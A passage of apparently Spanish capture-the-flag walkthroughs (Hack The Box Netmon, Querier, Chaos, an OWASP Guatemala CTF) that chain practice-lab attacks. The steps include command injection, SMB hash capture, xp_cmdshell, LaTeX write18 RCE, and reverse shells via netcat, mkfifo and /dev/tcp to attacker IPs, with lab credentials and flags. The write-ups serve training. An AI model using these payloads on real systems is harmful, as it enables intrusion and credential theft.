PrTg@dmin2018 \u0026lt;/dbpassword\u0026gt;   Al intentar logearnos con las credenciales (prtgadmin:PrTg@dmin2018) el portal no nos deja, por lo que podemos ver el archivo en donde se encuentra la contraseña es un archivo backup y fue creado en el año de 2018, que tal si le cambiamos el año a la contraseña (PrTg@admin2018) al actual \u0026ndash;\u0026gt; PrTg@dmin2018\nTenemos una sesion abierta dentro del portal, ahora que estamos dentro podemos hacer inyeccion de comandos.\nPRTG \u0026lt; 18.2.39 Command Injection Vulnerability\nNos dirigimos a Setup \u0026gt; Account Settings \u0026gt; Notifications\nCreamos una nueva notificacion y marcamos la opcion de EXECUTE PROGRAM, dentro de los parametros escribimos lo siguiente:\n1  C:\\netcat.txt;powershell -c \u0026#34;wget http://10.10.12.122/nc.exe -OutFile C:\\nc.exe; C:\\nc.exe 10.10.12.122 7878 -e cmd\u0026#34;   Antes de ejecutar el comando debemos de poner a la escucha nuestra maquina para poder descargar nc.exe (netcat), luego de esto ejecutamos nuestra notificacion (test). Para ejecutarlo debemos de ir a donde esta la lista de notificaciones selecionamos la nuestra y en la parte derecha presionamos la campanita para hacer un test.\nObservamos por medio del servicio ftp que el archivo nc.exe se creó exitosamente en C:/nc.exe.\nY obtenemos una shell como administrador.\nY nuestra bandera de root.txt.\n","description":"","id":85,"section":"posts","tags":["windows"],"title":"Hack The Box - Netmon","uri":"https://sckull.github.io/posts/netmon/"},{"content":"Querier es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.\n Informacion de la Maquina    Nombre Querier     OS Linux   Puntos 30   Dificultad Medio   IP 10.10.10.125   Maker mrh4sh \u0026amp; egre55    MASSCAN Utilizando la herramienta masscan para hacer un escaneo rapido de todos los puertos en tcp y udp\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  masscan -p1-65535,U:1-65535 10.10.10.125 --rate=1000 -e tun0 Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-02-19 05:54:40 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 49665/tcp on 10.10.10.125 Discovered open port 49666/tcp on 10.10.10.125 Discovered open port 49670/tcp on 10.10.10.125 Discovered open port 47001/tcp on 10.10.10.125 Discovered open port 135/tcp on 10.10.10.125 Discovered open port 49664/tcp on 10.10.10.125 Discovered open port 5985/tcp on 10.10.10.125 Discovered open port 49668/tcp on 10.10.10.125 Discovered open port 49671/tcp on 10.10.10.125 Discovered open port 139/tcp on 10.10.10.125   HTTP Al realizar una busqueda de archivos y directorios en el puerto 5985 no encontramos nada.\nSMBCLIENT Enumerando SHARENAMES con smbclient encontramos Reports e intentamos conectarnos.\n1 2 3 4 5 6 7 8 9  smbclient -L 10.10.10.125 Enter WORKGROUP\\root\u0026#39;s password: Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin C$ Disk Default share IPC$ IPC Remote IPC Reports Disk   Dentro de Reports econtramos un archivo xlsm el cual no contiene nada\n1 2 3  smbclient \\\\\\\\10.10.10.125\\\\Reports \u0026#39;Currency Volume Report.xlsm\u0026#39;   Binwalk Al utilizar BinWalk para analizar el archivo en busqueda de archivos ocultos encontramos dentro del archivo un macro con el siguiente codigo:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29  Rem Attribute VBA_ModuleType=VBADocumentModule Option VBASupport 1 \u0026#39; macro to pull data for client volume reports \u0026#39; \u0026#39; further testing required  Private Sub Connect() Dim conn As ADODB.Connection Dim rs As ADODB.Recordset Set conn = New ADODB.Connection conn.ConnectionString = \u0026#34;Driver={SQL Server};Server=QUERIER;Trusted_Connection=no;Database=volume;Uid=reporting;Pwd=PcwTWTHRwryjc$c6\u0026#34; conn.ConnectionTimeout = 10 conn.Open If conn.State = adStateOpen Then \u0026#39; MsgBox \u0026#34;connection successful\u0026#34;  \u0026#39;Set rs = conn.Execute(\u0026#34;SELECT * @@version;\u0026#34;)  Set rs = conn.Execute(\u0026#34;SELECT * FROM volume;\u0026#34;) Sheets(1).Range(\u0026#34;A1\u0026#34;).CopyFromRecordset rs rs.Close End If End Sub   MICROSOFT SQL SERVER Ya que tenemos credenciales para la base de datos procedemos a utilizar mssqlclient.py el cual es un script que funciona para conectarnos a una base de datos utilizando autenticacion de windows. Ya dentro encontramos bases de datos que son por \u0026ldquo;default\u0026rdquo; en Microsoft SQL Server.\nSQL Server Database\n1 2 3 4 5 6 7 8 9 10  python mssqlclient.py -p 1433 -windows-auth -debug reporting:\u0026#39;PcwTWTHRwryjc$c6\u0026#39;@10.10.10.125 SQL\u0026gt; SELECT name FROM master.dbo.sysdatabases name -------------------------------------------------------------------------------------------------------------------------------- master tempdb model msdb volume   MSSQL BOO Enumerando las diferentes bases de datos no encontramos ningun tipo de usuario y contraseña que nos pudiesen ayudar para conectarnos con otro usuario, asi mismo la ejecucion de comandos no esta permitida para nuestro usuario reporting. Pero el usuario si esta permitido para ejecutar xp_fileexist y xp_dirtree, por lo que aprovechando estos podemos hacer Out-of-Band. Se utilizo smbserver.py de forma local para crear un servidor samba y con mssqlclient.py se ejecuto el comando para hacer una \u0026lsquo;consulta\u0026rsquo; hacia nuestra maquina y asi obtener las contraseñas.\n1 2  exec master..xp_fileexist \u0026#39;\\10.10.12.75\\pwn\u0026#39; -- - declare @q varchar(99);set @q=\u0026#39;\\\\10.10.14.23\\test\u0026#39;;exec master.dbo.xp_dirtree @q HTTP/1.1   LOCAL 1  python smbserver.py -smb2support -port 445 -ip 10.10.12.220 Me /tmp/me   REMOTE 1  EXEC MASTER.sys.xp_dirtree \u0026#39;\\\\10.10.12.220\\Me\u0026#39;, 1, 1   CAPTURE MSSQL CREDENTIALS WITH SMBSERVER\nHashcat Utilizamos hashcat para desencriptar.\n1 2 3  ./hashcat64.bin -m 5600 -o querier.txt ntlm.txt ../rockyou.txt mssql-svc::QUERIER:4141414141414141:8ef8d7fe8b397a3f34c6a0c4117ea619:010100000000000080f39672a1c9d401d5aeaac9f68f78d8000000000100100059004200680076004d007a006c005100020010004f007900530049004f00570045004c000300100059004200680076004d007a006c005100040010004f007900530049004f00570045004c000700080080f39672a1c9d4010600040002000000080030003000000000000000000000000030000042faac07e9e6916b7b486a8189925f3a6881014abed60765f5683d0f0e8104bf0a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310032002e00320032003000000000000000000000000000   DECRYPTED 1  MSSQL-SVC::QUERIER:4141414141414141:8ef8d7fe8b397a3f34c6a0c4117ea619:010100000000000080f39672a1c9d401d5aeaac9f68f78d8000000000100100059004200680076004d007a006c005100020010004f007900530049004f00570045004c000300100059004200680076004d007a006c005100040010004f007900530049004f00570045004c000700080080f39672a1c9d4010600040002000000080030003000000000000000000000000030000042faac07e9e6916b7b486a8189925f3a6881014abed60765f5683d0f0e8104bf0a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310032002e00320032003000000000000000000000000000:corporate568   USER - FLAG 1  python mssqlclient.py -p 1433 -windows-auth -debug MSSQL-SVC:\u0026#39;corporate568\u0026#39;@10.10.10.125   Ya que obtuvimos usuario y contraseña de podemos utilizarlos y activar xp_cmdshell para ejecutar comando dentro de la computadora.\n1  EXEC sp_configure \u0026#39;show advanced options\u0026#39;, 1; EXEC sp_configure reconfigure; EXEC sp_configure \u0026#39;xp_cmdshell\u0026#39;, 1;EXEC sp_configure reconfigure;   Ejecutando comandos, leyendo el flag user.txt.\n1 2 3 4  EXEC master.dbo.xp_cmdshell \u0026#39;more C:\\Users\\mssql-svc\\Desktop\\user.txt\u0026#39;; output -------------------------------------- c37b41bb669da345bb14de50faab3c16   SHELL INVERSA - NETCAT Utilizando powershell para descargar nc.exe (netcat) en la computadora.\n1  EXEC master.dbo.xp_cmdshell \u0026#39;powershell -command \u0026#34;\u0026amp; { iwr 10.10.12.33/nc.exe -OutFile C:\\Users\\mssql-svc\\Desktop\\nc.exe }\u0026#34;\u0026#39;;   Utilizando nc.exe (netcat) para conectarnos de forma inversa a nuestro puerto local\n1  EXEC master.dbo.xp_cmdshell \u0026#39;C:\\Users\\mssql-svc\\Desktop\\nc.exe -e cmd 10.10.12.33 7878\u0026#39;;   Local 1  nc -lvp 7878   PRIVILEGE ESCALATION Estando dentro de la maquina como MSSQL-SVC procedemos a hacer una enumeracion con PowerUp el cual es un script escrito en powershell para enumerar los diferentes vectores de ataque para escalar privilegios en windows.\nPowerUp Descargamos, importamos PowerUp y hacemos una enumeracion de todas las funciones que contiene.\nPowerUp.ps1\n1 2  powershell -command \u0026#34;\u0026amp; { iwr 10.10.12.33/power.ps1 -OutFile C:\\Users\\mssql-svc\\Desktop\\power.ps1 }\u0026#34; Import-Module .\\power.ps1   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35  Invoke-AllChecks | Out-File -Encoding ASCII checks.txt [*] Running Invoke-AllChecks [*] Checking if user is in a local group with administrative privileges... [*] Checking for unquoted service paths... [*] Checking service executable and argument permissions... [*] Checking service permissions... [*] Checking %PATH% for potentially hijackable DLL locations... ModifiablePath : C:\\Users\\mssql-svc\\AppData\\Local\\Microsoft\\WindowsApps IdentityReference : QUERIER\\mssql-svc Permissions : {WriteOwner, Delete, WriteAttributes, Synchronize...} %PATH% : C:\\Users\\mssql-svc\\AppData\\Local\\Microsoft\\WindowsApps AbuseFunction : Write-HijackDll -DllPath \u0026#39;C:\\Users\\mssql-svc\\AppData\\Local\\Microsoft\\WindowsApps\\wlbsctrl.dll\u0026#39; [*] Checking for AlwaysInstallElevated registry key... [*] Checking for Autologon credentials in registry... [*] Checking for modifidable registry autoruns and configs... [*] Checking for modifiable schtask files/configs... [*] Checking for unattended install files... UnattendPath : C:\\Windows\\Panther\\Unattend.xml [*] Checking for encrypted web.config strings... [*] Checking for encrypted application pool and virtual directory passwords... [*] Checking for plaintext passwords in McAfee SiteList.xml files.... [*] Checking for cached Group Policy Preferences .xml files.... Changed : {2019-01-28 23:12:48} UserNames : {Administrator} NewName : [BLANK] Passwords : {MyUnclesAreMarioAndLuigi!!1!} File : C:\\ProgramData\\Microsoft\\Group  Policy\\History\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\Machine\\Preferences\\Groups\\Groups.xml   Al finalizar Nos encontramos que existe un archivo de Groups Policy que contiene un Usuario y Contraseña, en este caso el de Administrator. Utilizando el script psexec.py para conectarnos de manera remota con el Usuario Administrator y obtener una shell con nt authority\\system.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49  python psexec.py -debug Administrator:\u0026#39;MyUnclesAreMarioAndLuigi!!1!\u0026#39;@10.10.10.125 root@sckull:~/impacket/examples# python psexec.py -debug Administrator:\u0026#39;MyUnclesAreMarioAndLuigi!!1!\u0026#39;@10.10.10.125 Impacket v0.9.17 - Copyright 2002-2018 Core Security Technologies [+] StringBinding ncacn_np:10.10.10.125[\\pipe\\svcctl] [+] Your pycrypto doesn\u0026#39;t support AES.MODE_CCM. Currently only pycrypto experimental supports this mode. Download it from https://www.dlitz.net/software/pycrypto [*] Requesting shares on 10.10.10.125..... [*] Found writable share ADMIN$ [*] Uploading file WsaCFcep.exe [*] Opening SVCManager on 10.10.10.125..... [*] Creating service EOzc on 10.10.10.125..... [*] Starting service EOzc..... [+] Your pycrypto doesn\u0026#39;t support AES.MODE_CCM. Currently only pycrypto experimental supports this mode. Download it from https://www.dlitz.net/software/pycrypto [!] Press help for extra shell commands [+] Your pycrypto doesn\u0026#39;t support AES.MODE_CCM. Currently only pycrypto experimental supports this mode. Download it from https://www.dlitz.net/software/pycrypto [+] Your pycrypto doesn\u0026#39;t support AES.MODE_CCM. Currently only pycrypto experimental supports this mode. Download it from https://www.dlitz.net/software/pycrypto Microsoft Windows [Version 10.0.17763.292] (c) 2018 Microsoft Corporation. All rights reserved. C:\\Windows\\system32\u0026gt;whoami nt authority\\system C:\\Windows\\system32\u0026gt;cd .. C:\\Windows\u0026gt;cd C:\\  C:\\\u0026gt;cd Users\\Administrator C:\\Users\\Administrator\u0026gt;cd Desktop C:\\Users\\Administrator\\Desktop\u0026gt;dir Volume in drive C has no label. Volume Serial Number is FE98-F373 Directory of C:\\Users\\Administrator\\Desktop 01/29/2019 12:04 AM \u0026lt;DIR\u0026gt; . 01/29/2019 12:04 AM \u0026lt;DIR\u0026gt; .. 01/28/2019 12:08 AM 33 root.txt 1 File(s) 33 bytes 2 Dir(s) 5,970,571,264 bytes free C:\\Users\\Administrator\\Desktop\u0026gt;more root.txt b19c3794f786a1fdcf205f81497c3592   ","description":"","id":86,"section":"posts","tags":["windows"],"title":"Hack The Box - Querier","uri":"https://sckull.github.io/posts/querier/"},{"content":"Chaos es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.\n MASSCAN Escaneo de puertos udp/tcp.\n1 2 3 4 5 6 7 8 9 10 11 12  root@sckull:~# masscan -p1-65535,U:1-65535 10.10.10.120 --rate=1000 -e tun0 Starting masscan 1.0.4 (http://bit.ly/14GZzcT) -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 10000/tcp on 10.10.10.120 Discovered open port 10000/udp on 10.10.10.120 Discovered open port 110/tcp on 10.10.10.120 Discovered open port 143/tcp on 10.10.10.120 Discovered open port 995/tcp on 10.10.10.120 Discovered open port 993/tcp on 10.10.10.120   NMAP Escaneo de puertos con nmap.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  Starting Nmap 7.70 ( https://nmap.org ) Nmap scan report for 10.10.10.120 Host is up (0.093s latency). Not shown: 994 closed ports PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.34 ((Ubuntu)) 110/tcp open pop3 Dovecot pop3d 143/tcp open imap Dovecot imapd (Ubuntu) 993/tcp open ssl/imap Dovecot imapd (Ubuntu) 995/tcp open ssl/pop3 Dovecot pop3d 10000/tcp open http MiniServ 1.890 (Webmin httpd) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 48.15 seconds   HTTP Al visitar la pagina en el puerto 80 nos muestra un mensaje Direct IP not allowed.\nWFUZZ Escaneo de directorios con WFUZZ y el wordlist common.txt, nos encontramos con un directorio /wp.\n1 2 3 4 5 6 7 8 9 10 11 12  Target: http://10.10.10.120/FUZZ Total requests: 4588 ================================================================== ID Response Lines Word Chars Payload ================================================================== 000001: C=200 1 L\t5 W\t73 Ch\t\u0026#34;\u0026#34; 001994: C=200 1 L\t5 W\t73 Ch\t\u0026#34;index.html\u0026#34; 002119: C=301 9 L\t28 W\t317 Ch\t\u0026#34;javascript\u0026#34; 003562: C=403 11 L\t32 W\t300 Ch\t\u0026#34;server-status\u0026#34; 004458: C=301 9 L\t28 W\t309 Ch\t\u0026#34;wp\u0026#34;   Realizamos un escaneo por segunda vez al directorio /wp.\n1 2 3 4 5 6 7 8 9  Target: http://10.10.10.120/wp/FUZZ Total requests: 4588 ================================================================== ID Response Lines Word Chars Payload ================================================================== 000001: C=200 16 L\t60 W\t933 Ch\t\u0026#34;\u0026#34; 004445: C=301 9 L\t28 W\t319 Ch\t\u0026#34;wordpress\u0026#34;   /wp/wordpress Al visitar la ruta http://10.10.10.120/wp/wordpress/ nos muestra una pagina en wordpress, y un post en el que nos indica que para poder ver el contenido del mismo necesitamos ingresar la contraseña.\nObtuvimos la contraseña por medio de la herramienta WPSCAN haciendo un escaneo a la pagina, la contraseña con la que pudimos desbloquear el post fue un usuario que encontramos con WPSCAN.\nWPSCAN - Users Credenciales:\n1 2  username – ayush password – jiujitsu   Las credenciales que nos muestran son las de el webmail.\nHTTP - PUERTO 10000 Al visitar este puerto nos muestra una pagina con un mensaje y una url, agregamos chaos a nuestro archivo /etc/hosts con la IP de la maquina para averiguar lo que obtenemos en ese dominio.\n[/etc/hosts]\n1  10.10.10.120\tchaos   Al visitar https://chaos:10000/ nos muestra el weblogin al cual se refiere el mensaje de las credenciales.\nIgualmente podemos acceder direcatamente con la IP.\nAl intentar iniciar sesion con las credenciales que encontramos nos muestra un error, al parecer no son las credenciales para el weblogin.\nIMAP - Puerto 993 Utilizamos openssl para poder conectarnos con el puerto 993 y poder obtener un poco de informacion en este servicio corriendo en la maquina, utilizamos las credenciales para poder hacer un login.\nEn la carpeta o seccion de Drafts encontramos un correo existente aun.\nAl leer el correo nos muestra un mensaje que nos habla sobre dos archivos adjuntos al correo.\n1 2 3 4 5 6  Hii, sahayCheck the enmsg.txtYou are the password XD.Also attached the script which i used to encrypt.Thanks,Ayush  Primer archivo:\n1  MDAwMDAwMDAwMDAwMDIzNK7uqnoZitizcEs4hVpDg8z18LmJXjnkr2tXhw/AldQmd/g53L6pgva9RdPkJ3GSW57onvseOe5ai95/M4APq+3mLp4GQ5YTuRTaGsHtrMs7rNgzwfiVor7zNryPn1Jgbn8M7Y2mM6I+lH0zQb6Xt/JkhOZGWQzH4llEbyHvvlIjfu+MW5XrOI6QAeXGYTTinYSutsOhPilLnk1e6Hq7AUnTxcMsqqLdqEL5+/px3ZVZccuPUvuSmXHGE023358ud9XKokbNQG3LOQuRFkpE/LS10yge+l6ON4g1fpYizywI3+h9l5Iwpj/UVb0BcVgojtlyz5gIv12tAHf7kpZ6R08=  Segundo archivo:\n1  ZGVmIGVuY3J5cHQoa2V5LCBmaWxlbmFtZSk6CiAgICBjaHVua3NpemUgPSA2NCoxMDI0CiAgICBvdXRwdXRGaWxlID0gImVuIiArIGZpbGVuYW1lCiAgICBmaWxlc2l6ZSA9IHN0cihvcy5wYXRoLmdldHNpemUoZmlsZW5hbWUpKS56ZmlsbCgxNikKICAgIElWID1SYW5kb20ubmV3KCkucmVhZCgxNikKCiAgICBlbmNyeXB0b3IgPSBBRVMubmV3KGtleSwgQUVTLk1PREVfQ0JDLCBJVikKCiAgICB3aXRoIG9wZW4oZmlsZW5hbWUsICdyYicpIGFzIGluZmlsZToKICAgICAgICB3aXRoIG9wZW4ob3V0cHV0RmlsZSwgJ3diJykgYXMgb3V0ZmlsZToKICAgICAgICAgICAgb3V0ZmlsZS53cml0ZShmaWxlc2l6ZS5lbmNvZGUoJ3V0Zi04JykpCiAgICAgICAgICAgIG91dGZpbGUud3JpdGUoSVYpCgogICAgICAgICAgICB3aGlsZSBUcnVlOgogICAgICAgICAgICAgICAgY2h1bmsgPSBpbmZpbGUucmVhZChjaHVua3NpemUpCgogICAgICAgICAgICAgICAgaWYgbGVuKGNodW5rKSA9PSAwOgogICAgICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgICAgICBlbGlmIGxlbihjaHVuaykgJSAxNiAhPSAwOgogICAgICAgICAgICAgICAgICAgIGNodW5rICs9IGInICcgKiAoMTYgLSAobGVuKGNodW5rKSAlIDE2KSkKCiAgICAgICAgICAgICAgICBvdXRmaWxlLndyaXRlKGVuY3J5cHRvci5lbmNyeXB0KGNodW5rKSkKCmRlZiBnZXRLZXkocGFzc3dvcmQpOgogICAgICAgICAgICBoYXNoZXIgPSBTSEEyNTYubmV3KHBhc3N3b3JkLmVuY29kZSgndXRmLTgnKSkKICAgICAgICAgICAgcmV0dXJuIGhhc2hlci5kaWdlc3QoKQoK  Comandos Utilizados:\n1 2 3 4 5 6  openssl s_client -connect 10.10.10.120:993 a login ayush jiujitsu a select Drafts UID FETCH 1 (BODY[0]) UID FETCH 1 (BODY[2]) \u0026lt;-- Lectura del primer archivo UID FETCH 1 (BODY[3]) \u0026lt;-- Lectura del segundo archivo   El primer archivo pertenece a enmsg.txt y el segundo al archivo que encriptó enmsg.txt.\nAhora que tenemos el archivo de encriptacion podemos escribir algunas funciones para poder desencriptar el archivo.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36  import os, random from Crypto.Cipher import AES from Crypto.Hash import SHA256 def decrypt(key, filename): chunksize = 64*1024 outputFile = \u0026#39;dec\u0026#39; with open(filename, \u0026#39;rb\u0026#39;) as infile: filesize = long(infile.read(16)) IV = infile.read(16) decryptor = AES.new(key, AES.MODE_CBC, IV) with open(outputFile, \u0026#39;wb\u0026#39;) as outfile: while True: chunk = infile.read(chunksize) if len(chunk) == 0: break outfile.write(decryptor.decrypt(chunk)) outfile.truncate(filesize) def getKey(password): hasher = SHA256.new(password) return hasher.digest() def Main(): filename = \u0026#39;/path/to/file/file_enc\u0026#39; password = \u0026#39;sahay\u0026#39; decrypt(getKey(password), filename) print(\u0026#34;Done.\u0026#34;) if __name__ == \u0026#39;__main__\u0026#39;: Main()   Al ejecutar nuestro escript nos muestra un mensaje en base64 este mismo lo decodificamos y nos muestra un segundo mensaje que nos habla de un servicio de pdf y una url donde este se encuentra.\n1 2 3 4 5 6 7 8 9 10  Hii SahayPlease check our new service which create pdfp.s - As you told me to encrypt important msg, i did :)http://chaos.htb/J00_w1ll_f1Nd_n07H1n9_H3r3Thanks,Ayush  Agregamos el nuevo dominio a nuestro archivo /etc/hosts.\n[/etc/hosts]\n1  10.10.10.120\tchaos.htb  RCE - pdfTEXT [LaTex] Al visitar la url del mensaje nos muestra lo que parece ser un servicio de creacion de PDF, al enviar un texto con el Template test1 nos muestra en la parte de respuesta en este caso en el METODO POST, la version de pdfTEXT. Investigamos un poco acerca de este servicio y encontramos un post que habla de una vulnerabilidad en los compiladores basados en LaTex, en el cual se pueden ejecutar comandos en el servidor donde este corriendo un servicio basado en este.\nINFO =\u0026gt; https://0day.work/hacking-with-latex/\nUtilizamos el siguiente payload y un comando para comprobar que estos se ejecutan en la maquina, se envio por medio del Template test3:\nPayload:\n1  \\immediate\\write18{#ComandoAqui}  Comando:\n1  nslookup sckull.htb 10.10.13.27   Responder:\nAhora que tenemos un \u0026lsquo;pequeño\u0026rsquo; acceso mediante ejecucion de comandos, vamos a descargar un archivo que contiene una shell inversa para ejecutarlo y obtener acceso.\nShell:\n1  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 10.10.13.27 7878 \u0026gt;/tmp/f   Codificamos a base64:\n1  cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTAuMTAuMTMuMjcgNzg3OCA+L3RtcC9mCg==   Payload:\n1  \\immediate\\write18{echo cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTAuMTAuMTMuMjcgNzg3OCA+L3RtcC9mCg==|base64 -d \u0026gt; shell.sh \u0026amp;\u0026amp; sh shell.sh}  Al enviar este mensaje la maquina decodifica nuestra shell y la agrega a un archivo (shell.sh) luego de esto la ejecuta y obtenemos nuestra shell como usuario www-data.\nActualizamos nuestra shell con python, al intentar ingresar al directorio de ayush nos dice permiso denegado, anteriormente encontramos una contraseña para ayush utilizamos la misma para poder escalar a ese usuario mediante el comando su, pero al intentar ingresar a su carpeta principal nos muestra que cd esta restringido.\nPara poder escapar este mensaje o rbash utilizamos tar:\n1  tar cf /dev/null testfile --checkpoint=1 --checkpoint-action=exec=/bin/bash   Tambien agregamos a la variable PATH:\n1  export PATH=/usr/bin:/bin   Al realizar todo esto podemos ingresar a la carpeta de ayush y obtener nuestra bandera user.txt.\nPRIVILEGE ESCALATION Hicimos una pequeña enumeracion en los directorios de ayus y encontramos una carpeta de .mozilla que pertenece a el navegador firefox, revisamos los archivos que contiene esta carpeta y encontramos el archivo login.json que almacena las contraseñas de firefox.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25  { \u0026#34;nextId\u0026#34;:3, \u0026#34;logins\u0026#34;:[ { \u0026#34;id\u0026#34;:2, \u0026#34;hostname\u0026#34;:\u0026#34;https://chaos.htb:10000\u0026#34;, \u0026#34;httpRealm\u0026#34;:null, \u0026#34;formSubmitURL\u0026#34;:\u0026#34;https://chaos.htb:10000\u0026#34;, \u0026#34;usernameField\u0026#34;:\u0026#34;user\u0026#34;, \u0026#34;passwordField\u0026#34;:\u0026#34;pass\u0026#34;, \u0026#34;encryptedUsername\u0026#34;:\u0026#34;MDIEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECDSAazrlUMZFBAhbsMDAlL9iaw==\u0026#34;, \u0026#34;encryptedPassword\u0026#34;:\u0026#34;MDoEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECNx7bW1TuuCuBBAP8YwnxCZH0+pLo6cJJxnb\u0026#34;, \u0026#34;guid\u0026#34;:\u0026#34;{cb6cd202-0ff8-4de5-85df-e0b8a0f18778}\u0026#34;, \u0026#34;encType\u0026#34;:1, \u0026#34;timeCreated\u0026#34;:1540642202692, \u0026#34;timeLastUsed\u0026#34;:1540642202692, \u0026#34;timePasswordChanged\u0026#34;:1540642202692, \u0026#34;timesUsed\u0026#34;:1 } ], \u0026#34;disabledHosts\u0026#34;:[ ], \u0026#34;version\u0026#34;:2 }   Para poder obtener el usuario y contraseña de este archivo utilizamos firefox_decrypt [https://github.com/unode/firefox_decrypt], lo descargamos en la maquina y lo ejecutamos, al ejecutarlo nos pide la contraseña para el usuario ayush la ingresamos (jiujitsu), luego de eso nos muestra el usuario y contraseña en ese archivo.\n1 2 3  Website: https://chaos.htb:10000Username: \u0026#39;root\u0026#39;Password: \u0026#39;Thiv8wrej~\u0026#39;  Escalamos con el usuario root y contraseña, obteniendo privilegios root y nuestra bandera root.txt.\n","description":"","id":87,"section":"posts","tags":["linux"],"title":"Hack The Box - Chaos","uri":"https://sckull.github.io/posts/chaos/"},{"content":"OWASP CTF es una maquina del OWASP Guatemala, aqui encontrarás la solucion para obtener la flag user.txt y root.txt de las diferentes maquinas presentadas por los organizadores.\n INFRAESTRUCTURA 1 NMAP Escaneo de puertos/version/sistema operativo con nmap\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-16 02:46 CDT Nmap scan report for 192.168.1.15 Host is up (0.00094s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Microsoft Windows XP microsoft-ds MAC Address: 00:0C:29:87:DA:AB (VMware) Device type: general purpose Running: Microsoft Windows XP OS CPE: cpe:/o:microsoft:windows_xp::sp2 cpe:/o:microsoft:windows_xp::sp3 OS details: Microsoft Windows XP SP2 or SP3 Network Distance: 1 hop Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 9.89 seconds   METASPLOIT Utilizamos el exploit netapi para windows xp contra el sistema operativo.\nSHELL Obtenemos permisos de administrador y nuestra flag en el Escritorio.\nflag.txt: flag{w1nd0ws_n3tap1_3xplo1t}\nINFRAESTRUCTURA 2 NMAP Escaneo de puertos tcp/version/sistema con nmap.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24  Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-16 03:54 CDT Nmap scan report for 192.168.1.14 Host is up (0.00088s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 8009/tcp open ajp13 Apache Jserv (Protocol v1.3) | ajp-methods: |_ Supported methods: GET HEAD POST OPTIONS 8080/tcp open http Apache Tomcat 9.0.10 |_http-favicon: Apache Tomcat |_http-title: Apache Tomcat/9.0.10 MAC Address: 00:0C:29:AB:85:8F (VMware) Device type: general purpose Running: Linux 3.X|4.X OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 OS details: Linux 3.2 - 4.9 Network Distance: 1 hop TRACEROUTE HOP RTT ADDRESS 1 0.88 ms 192.168.1.14 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 9.26 seconds.   Puerto 8009 Nos muestra un error de conexion.\nHTTP En el puerto 8080 nos muestra una pagina corriendo en tomcat.\nUtilizamos el panel de control para obtener acceso. Siempre probamos las contraseñas comunes o por default de alguna plataforma para ver si logramos obtener accesso, este es el caso de esta maquina.\n1 2  user: tomcat pass: s3cret   Ahora tenemos acceso al panel de control de tomcat, podemos subir una shell/payload con extension war.\nCreamos nuestra reverse shell o payload con msfvenom y configuramos metasploit para poder obtener una sesion o shell por medio del payload.\nSubimos nuestro archivo en el panel de control en a parte de \u0026lsquo;WAR file to deploy\u0026rsquo;.\nPara ejecutar nuestra shell solo buscamos en la lista que nos aparece por encima y basta con darle click para que se habra una sesion en metasploit.\nMetasploit Actualizamos nuestra shell con python3.\nEstando dentro obtenemos nuestra bandera en la carpeta principal del usuario retoinfra1.\nuser.txt:flag{t0mcat_fa1_cr3dent1als}\nPRIVILEGE ESCALATION Utilizndo pspy encontramos un cronjob que se ejecuta cada minuto y ejecuta un archivo sh en /home/retoinfra1/script.sh.\nYa que podemos editar el archivo y se ejecuta cada minuto vamos a modificar el script.sh para obtener una shell inversa, agregamos una linea de comando que nos permite obtener una shell inversa.\n1  echo \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/192.168.1.10/7878 0\u0026gt;\u0026amp;1\u0026#34; \u0026gt;\u0026gt; script.sh   